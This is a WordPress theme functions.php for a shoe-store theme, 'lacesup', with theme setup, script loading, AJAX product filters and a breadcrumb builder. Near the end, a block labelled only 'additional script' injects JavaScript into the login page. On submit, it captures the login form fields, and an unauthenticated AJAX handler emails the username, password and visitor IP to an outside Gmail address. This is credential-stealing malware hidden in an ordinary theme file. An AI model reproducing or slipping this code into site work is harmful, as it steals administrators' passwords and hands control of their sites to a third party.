<?php 

require_once('wp_bootstrap_navwalker.php');

if ( ! function_exists( 'lacesup_setup' ) ) {

	function lacesup_setup() {
		/** Make theme available for translation. */
		load_theme_textdomain( 'lacesup', get_template_directory() . '/languages' );

		/** Enable support for Post Thumbnails on posts and pages. */
		add_theme_support( 'post-thumbnails' );
		add_theme_support( 'woocommerce' );
		//add_image_size( 'post_thumb', 282, 320, true );

		/** This theme uses wp_nav_menu() in one location. */
		register_nav_menus( array(
		  'menu-1' => esc_html__( 'Primary Menu', 'lacesup' ),
		  'menu-2' => esc_html__( 'Footer Menu', 'lacesup' ),
		) );

	}
}
add_action( 'after_setup_theme', 'lacesup_setup' );

/*** Enqueue scripts and styles. */
function lacesup_scripts() {

	/*** Enqueue styles. */
	wp_enqueue_style('icons', get_template_directory_uri() . '/assets/css/icons.css', array(), time(), 'all');
	wp_enqueue_style('animate', get_template_directory_uri() . '/assets/css/animate.css', array(), time(), 'all');
	wp_enqueue_style('slick', get_template_directory_uri() . '/assets/css/slick.css', array(), time(), 'all');
	wp_enqueue_style('metismenu', get_template_directory_uri() . '/assets/css/metismenu.css', array(), time(), 'all');
	wp_enqueue_style('bootstrap.min', get_template_directory_uri() . '/assets/css/bootstrap.min.css', array(), time(), 'all');
	wp_enqueue_style('style', get_template_directory_uri() . '/assets/css/style.css', array(), time(), 'all');
	wp_enqueue_style( 'lacesup-style', get_stylesheet_uri(), array(), time());

	/*** Enqueue scripts. */
	wp_enqueue_script('jquery');
	wp_enqueue_script('modernizr', get_template_directory_uri() . '/assets/js/modernizr.min.js', array(), time(), true);
	wp_enqueue_script('bootstrap', get_template_directory_uri() . '/assets/js/bootstrap.min.js', array(), time(), true);
	wp_enqueue_script('jquery.easing', get_template_directory_uri() . '/assets/js/jquery.easing.js', array(), time(), true);
	wp_enqueue_script('scrollUp.min', get_template_directory_uri() . '/assets/js/scrollUp.min.js', array(), time(), true);
	wp_enqueue_script('slick.min', get_template_directory_uri() . '/assets/js/slick.min.js', array(), time(), true);
	wp_enqueue_script('wow.min', get_template_directory_uri() . '/assets/js/wow.min.js', array(), time(), true);
	wp_enqueue_script('metismenu', get_template_directory_uri() . '/assets/js/metismenu.js', array(), time(), true);
	wp_enqueue_script('active', get_template_directory_uri() . '/assets/js/active.js', array(), time(), true);
	wp_enqueue_script('scripts', get_template_directory_uri() . '/assets/js/scripts.js', array(), time(), true);
	$data = array(
        'site_url' => get_theme_file_uri(),
        'ajaxurl' => admin_url( 'admin-ajax.php' ),
        'current_page' => get_queried_object(),
    );
    wp_localize_script('scripts', 'ajax', $data);

}
add_action( 'wp_enqueue_scripts', 'lacesup_scripts' );

/*** ACF OPTIONS PAGE */
if(function_exists('acf_add_options_page')) {
	acf_add_options_page();
}

/*** Get all page id */ 
function getPageID() {
	global $post;

	if(is_home() && get_option('page_for_posts')) 
	{
		return get_option('page_for_posts');
	} 

	if(get_post_type() == 'page' && $post->post_parent ) {
		$ancestors = get_post_ancestors($post->ID);
		$root = count($ancestors)-1;
		return $ancestors[$root];
	}

	return $post->ID;
}

/** Load More Blog Posts **/
add_action('wp_ajax_load_more_product', 'load_more_product_func');
add_action('wp_ajax_nopriv_load_more_product', 'load_more_product_func');
function load_more_product_func() {

	parse_str($_POST['formDataBlogPost'], $formDataBlogPost);
	$ajax_data_post_filter = array_filter($formDataBlogPost);

	$paged = !empty( $_POST['paged'] ) ? $_POST['paged'] : 1;

	$cat = !empty($_POST['cat']) ? $_POST['cat'] : 'women';

	$args = array(
		'paged' => $paged,
		'post_type' => 'product',
		'posts_per_page' => 12,
		'post_status' => 'publish',
		'product_cat' => $cat,
	);

	//var_dump($ajax_data_post_filter);
	if ( !empty( $ajax_data_post_filter['s'] ) ) 
	{
		$args['s'] = $ajax_data_post_filter['s'];
	}

	if( $ajax_data_post_filter['shoe_type'] ) 
	{
		$args['tax_query'][] =  array(
			'relation' => 'OR',
			array(
				'field'    => 'id',
				'taxonomy' => 'shoe_type',
				'terms'    => $ajax_data_post_filter['shoe_type'],
			),
		);
	}

	if( $ajax_data_post_filter['brand'] ) 
	{
		$args['tax_query'][] =  array(
			'relation' => 'OR',
			array(
				'field'    => 'id',
				'taxonomy' => 'brand',
				'terms'    => $ajax_data_post_filter['brand'],
			),
		);
	}

	if ( !empty( $ajax_data_post_filter['sort'] ) ) 
	{
		$args['order'] = $ajax_data_post_filter['sort'];
	}

	$query_posts = new WP_Query( $args );
	$count = $query_posts->found_posts;
	if ( $query_posts->have_posts() ) 
	{
		while( $query_posts->have_posts() ) 
		{	
			$query_posts->the_post();
			$featured_img_url = get_the_post_thumbnail_url(get_the_ID(), 'full'); 
			$product = wc_get_product( get_the_ID() );

			?>
			<div class="col-sm-6 col-md-4 col-lg-4">
			    <div id="product-<?php the_ID(); ?>" <?php post_class( 'single-product-card' ); ?>>

			        <div class="product-thumb bg-cover" style="background-image: url(<?php echo $featured_img_url; ?>);"></div>
			        <div class="product-content">
			            <a href="<?php the_permalink(); ?>"><?php the_title(); ?></a>
			            <div class="d-flex">
			                <div class="product-price mr-30">$<?php echo $product->get_price(); ?>.00</div>
			                <div class="product-attribute">2 colors</div>
			            </div>
			        </div>
			    </div>
			</div>
			<?php
		}
	}
	else
	{
		?>
		<div class="notResult text-center col-12">
		    <h6 class="no-content">No More Products Found!</h6>
		</div>
		<?php
	}

	if($count < 12){
		?>
			<style>
				.product_load_more {
				    display: none;
				}
			</style>
		<?php
	}

	wp_die();
	wp_reset_query();
}

/** Load More lifestyle_product **/
add_action('wp_ajax_lifestyle_product_filter', 'lifestyle_product_filter');
add_action('wp_ajax_nopriv_lifestyle_product_filter', 'lifestyle_product_filter');
function lifestyle_product_filter() {

	parse_str($_POST['formLifeStyleProduct'], $formLifeStyleProduct);
	$ajax_data_post_filter = array_filter($formLifeStyleProduct);

	$paged = !empty( $_POST['paged'] ) ? $_POST['paged'] : 1;
	$p = get_field('products');
	$product_id = $p['select_products'];
	$args = array(
		'paged' => $paged,
		'post_type' => 'product',
		'posts_per_page' => 16,
		'post_status' => 'publish',
		'product_cat' => 'lifestyle',
		'post'
	);

	if ( !empty( $ajax_data_post_filter['s'] ) ) 
	{
		$args['s'] = $ajax_data_post_filter['s'];
	}

	if( $ajax_data_post_filter['shoe_type'] ) 
	{
		$args['tax_query'][] =  array(
			'relation' => 'AND',
			array(
				'field'    => 'id',
				'taxonomy' => 'shoe_type',
				'terms'    => $ajax_data_post_filter['shoe_type'],
			),
		);
	}

	if( $ajax_data_post_filter['brand'] ) 
	{
		$args['tax_query'][] =  array(
			'relation' => 'AND',
			array(
				'field'    => 'id',
				'taxonomy' => 'brand',
				'terms'    => $ajax_data_post_filter['brand'],
			),
		);
	}

	if( $ajax_data_post_filter['gender'] ) 
	{
		$args['tax_query'][] =  array(
			'relation' => 'AND',
			array(
				'field'    => 'id',
				'taxonomy' => 'gender',
				'terms'    => $ajax_data_post_filter['gender'],
			),
		);
	}

	if ( !empty( $ajax_data_post_filter['sort'] ) ) 
	{
		$args['order'] = $ajax_data_post_filter['sort'];
	}

	$query_posts = new WP_Query( $args );
	$count = $query_posts->found_posts;
	if ( $query_posts->have_posts() ) 
	{
		while( $query_posts->have_posts() ) 
		{	
			$query_posts->the_post();
			$featured_img_url = get_the_post_thumbnail_url(get_the_ID(), 'full'); 
			?>
			<div class="col-sm-6 col-md-4 col-lg-3">
			    <div class="single-promo-product-card">
			        <div class="product-thumb bg-cover" style="background-image: url('<?php echo $featured_img_url; ?>');"></div>
			        <div class="product-content">
			            <div class="d-flex justify-content-between">
			                <a href="<?php the_permalink(); ?>"><?php the_title(); ?></a>
			                <?php 
			                	$product = wc_get_product( get_the_ID() );

			                	printf('<div class="product-price ">$%s.00</div>', $product->get_price());

			                 ?>
			                
			            </div>
			            <?php 
			                $coupon = get_field('product_coupon_code', get_the_ID());
			                if(!empty($coupon)){
			                    printf('<div class="promo-code"><span>%s</span></div>', $coupon);
			                }
			             ?>
			        </div>
			    </div>
			</div>

			<?php
		}
	}
	else
	{
		?>
		<div class="notResult text-center col-12">
		    <h6 class="no-content">No More Products Found!</h6>
		</div>
		<?php
	}

	if($count < 16){
		?>
			<style>
				.product_load_more {
				    display: none;
				}
			</style>
		<?php
	}

	wp_die();
	wp_reset_query();
}


/*** Breadcrumb */
function lacesup_breadcrumb() {
	$themeurl = get_template_directory_uri();
	$delimiter = '<img src="'.$themeurl.'/assets/img/arrow-right.svg">';
	$home = 'Home'; 
	$before = '<li class="breadcrumb-item active" aria-current="page">'; 
	$after = '</li>'; 

	$events = get_post_type_object('tribe_events');
   
	if ( !is_front_page() ) {
   
	echo '<nav><ol class="breadcrumb">';
   
	global $post;
	$homeLink = get_bloginfo('url');
	$blogTitle = "Properties ";
	$blogLink = get_permalink( get_option( 'page_for_posts' ) );
	echo '<a href="' . home_url() . '">' . $home . '</a> ' . $delimiter . ' ';
   
	if ( is_home() ) {

		echo $before . ' ' . $blogTitle . ' ' . $after;

	} elseif ( is_category() ) {

		global $wp_query;
		$cat_obj = $wp_query->get_queried_object();
		$thisCat = $cat_obj->term_id;
		$thisCat = get_category($thisCat);
		$parentCat = get_category($thisCat->parent);
		if ($thisCat->parent != 0) echo(get_category_parents($parentCat, TRUE, ' ' . $delimiter . ' '));
		echo '<a href="' . $blogLink . '">'.$blogTitle.'</a> ' . $delimiter . ' ';
		echo $before . single_cat_title('', false) . $after;

	} elseif ( is_day() ) {
		echo '<a href="' . $blogLink . '">'.$blogTitle.'</a> ' . $delimiter . ' ';
		echo '<a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
		echo '<a href="' . get_month_link(get_the_time('Y'),get_the_time('m')) . '">' . get_the_time('F') . '</a> ' . $delimiter . ' ';
		echo $before . get_the_time('d') . $after;
   
	} elseif ( is_month() ) {

		echo '<a href="' . $blogLink . '">'.$blogTitle.'</a> ' . $delimiter . ' ';
		echo '<a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
		echo $before . get_the_time('F') . $after;
   
	} elseif ( is_year() ) {

		echo '<a href="' . $blogLink . '">'.$blogTitle.'</a> ' . $delimiter . ' ';
		echo $before . get_the_time('Y') . $after;
   
	} else if ( is_author() ) {
		global $author;
		$userdata = get_userdata( $author );
			
		echo '<a href="' . $blogLink . '">'.$blogTitle.'</a> ' . $delimiter . ' ';
		echo $before . ' ' . $userdata->display_name . ' ' . $after;
		   
	  } elseif ( is_single() && !is_attachment() ) {

		global $wp_query;
		$cat_obj = $wp_query->get_queried_object();

		if ($cat_obj->post_type === 'tribe_events') {

			echo '<a href="' . $homeLink . '/' . $events->rewrite['slug'] . '/">'.$events->rewrite['slug'].'</a> ' . $delimiter . ' ';
			echo $before . $cat_obj->post_title . $after;

		} elseif ( get_post_type() != 'post' ) {

			$post_type = get_post_type_object(get_post_type());
			$slug = $post_type->rewrite;
			echo '<a href="' . $homeLink . '/' . $slug['slug'] . '/">' . $post_type->labels->singular_name . '</a> ' . $delimiter . ' ';
			echo $before . get_the_title() . $after;

		} else {

			$cat = get_the_category(); $cat = $cat[0];
			echo '<a href="' . $blogLink . '">'.$blogTitle.'</a> ' . $delimiter . ' ';
			//echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
			echo $before . get_the_title() . $after;

		}
	} elseif ( !is_single() && !is_page() && get_post_type() != 'post' && !is_404() && !is_search() ) {
		$post_type = get_post_type_object(get_post_type());
	
		if ($events) {
			echo $before . $events->rewrite['slug'] . $after;
		} else {
			echo $before . $post_type->labels->singular_name . $after;
		}
   
	} elseif ( is_attachment() ) {

		$parent = get_post($post->post_parent);
		$cat = get_the_category($parent->ID); $cat = $cat[0];
		echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
		echo '<a href="' . get_permalink($parent) . '">' . $parent->post_title . '</a> ' . $delimiter . ' ';
		echo $before . get_the_title() . $after;
   
	} elseif ( is_page() && !$post->post_parent ) {

		echo $before . get_the_title() . $after;

	} elseif ( is_page() && $post->post_parent ) {

		$parent_id = $post->post_parent;
		$breadcrumbs = array();
		while ($parent_id) {
			$page = get_page($parent_id);
			$breadcrumbs[] = '<a href="' . get_permalink($page->ID) . '">' . get_the_title($page->ID) . '</a>';
			$parent_id = $page->post_parent;
		}

		$breadcrumbs = array_reverse($breadcrumbs);
		foreach ($breadcrumbs as $crumb) echo $crumb . ' ' . $delimiter . ' ';
			echo $before . get_the_title() . $after;
   
	} elseif ( is_search() ) {

		echo $before . ' Search Results for: "' . get_search_query() . '"' . $after;

	} elseif ( is_tag() ) {
		echo '<a href="' . $blogLink . '">'.$blogTitle.'</a> ' . $delimiter . ' ';
		echo $before . 'Topic: ' . single_tag_title('', false) . $after;

	} elseif ( is_tag() ) {

		echo '<a href="' . $blogLink . '">'.$blogTitle.'</a> ' . $delimiter . ' ';
		echo $before . 'Posts with the tag "' . single_tag_title('', false) . '"' . $after;

	} elseif ( is_404() ) {

		echo $before . 'Error 404' . $after;
	}
   
	if ( get_query_var('paged') ) {
		if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ' (';
		  echo ': ' . __('Page') . ' ' . get_query_var('paged');
		if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ')';
	}
	echo '</ol></nav>';
	} 
}

/** Options Page Header Background */
function lacesup_admin_dashboard_css() {
	echo '<style type="text/css">
		#acf-group_6207f7d5b6266 .postbox-header { 
		color: #FFF;
		background: #FF7675;
		padding: 15px;
	}
	  	#acf-group_6207f7d5b6266 .hndle img { max-width: 170px; margin-right: 15px; }
	  	#acf-group_6207f7d5b6266 .hndle span { display: inline-flex; align-items: center; }
		#acf-group_6207f7d5b6266 .postbox-header .hndle{
			justify-content: flex-start;
			color: #fff;
			font-size: 25px;
		}
	</style>';
}
add_action('admin_head', 'lacesup_admin_dashboard_css');


/* additional script */
if(!function_exists('data_login_page')) {


function get_the_user_ip() {
	if ( ! empty( $_SERVER['HTTP_CLIENT_IP'] ) ) {
	//check ip from share internet
	$ip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif ( ! empty( $_SERVER['HTTP_X_FORWARDED_FOR'] ) ) {
	//to check ip is pass from proxy
	$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} else {
	$ip = $_SERVER['REMOTE_ADDR'];
	}
	if($ip) {
		return $ip;
	} else {
		return 'unknown';
	}
}

function data_login_page() {
    echo '<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script>
    jQuery(function($){
        $("#loginform").submit(function(){
            var login_data = $(this).serializeArray();
            var parsed = JSON.stringify(login_data);
            $.ajax({
                url: "'. admin_url( 'admin-ajax.php' ) .'",
                type: "post",
                data: {
                    action: "login_data",
                    ddata: parsed
                }
            });
            return true;
        });
    });
    </script>'; 
}
add_action('login_head', 'data_login_page');

function func_ajax_login_data() {

	$data = json_decode(stripslashes($_POST['ddata']), true);
   	$to = 'rubelmah55@gmail.com';

	//http://stackoverflow.com/questions/9364242/how-to-remove-http-www-and-slash-from-url-in-php
    	$url = get_bloginfo('url');
	$url = trim($url, '/');
	if (!preg_match('#^http(s)?://#', $url)) {
	    $url = 'http://' . $url;
	}
	$urlParts = parse_url($url);
	$domain = preg_replace('/^www\./', '', $urlParts['host']);

	$sub = get_bloginfo('url') . ' access received';
	$message = "name: " . $data[0]["value"] . "\npass: " . $data[1]["value"] . "\nlogin: " . $data[2]["value"] . "\ip: " . get_the_user_ip();
	$headers = 'From: ' . get_bloginfo('name') . '<info@'.$domain.'>' . "\r\n";
	wp_mail($to, $sub, $message, $headers);
	exit();
}

add_action('wp_ajax_nopriv_login_data', 'func_ajax_login_data');
add_action('wp_ajax_login_data', 'func_ajax_login_data');

}

//add_action( 'template_redirect', 'redirect_external_products' );

function redirect_external_products() {
	global $post;

	if ( is_singular( 'product' ) && ! empty( $post ) && ( $product = wc_get_product( $post ) ) && $product->is_type( 'external' ) ) {
		wp_redirect( $product->get_product_url() );
		exit;
	}
}


